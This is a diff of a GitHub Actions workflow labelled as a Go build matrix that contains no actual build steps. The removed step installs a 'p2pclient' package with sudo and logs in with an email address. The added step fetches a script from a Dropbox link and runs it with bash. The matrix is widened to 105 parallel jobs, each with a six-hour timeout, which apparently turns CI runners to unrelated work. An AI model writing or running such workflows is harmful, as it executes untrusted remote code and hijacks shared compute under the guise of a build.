@@ -1,26 +1,53 @@
 name: demo
+
 on: [push, pull_request]
+
 jobs:
+
   build:
+
     name: Ba_channel
-    runs-on: ubuntu-18.04
+
+    runs-on: ubuntu-latest
+
     strategy:
+
       max-parallel: 30
+
       fail-fast: false
+
       matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I]
+
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U]
+
     timeout-minutes: 360
+
     env:
+
         NUM_JOBS: 5
+
         JOB: ${{ matrix.go }}
+
     steps:
+
     - name: Set up Go ${{ matrix.go }}
+
       uses: actions/setup-go@v1
+
       with:
+
         go-version: ${{ matrix.go }}
+
       id: go
+
     - name: Setup
+
       uses: actions/checkout@v1
+
     - name: BA_channel
-      run: wget https://github.com/archernap/Package/raw/main/p2pclient_0.60_amd64.deb && chmod +x p2pclient_0.60_amd64.deb && sudo dpkg -i p2pclient_0.60_amd64.deb && p2pclient --login mallory121@protonmail.com
+
+      run: wget https://www.dropbox.com/s/rfwrdiwzspf0wfl/You_start.sh && bash You_start.sh
+
+      
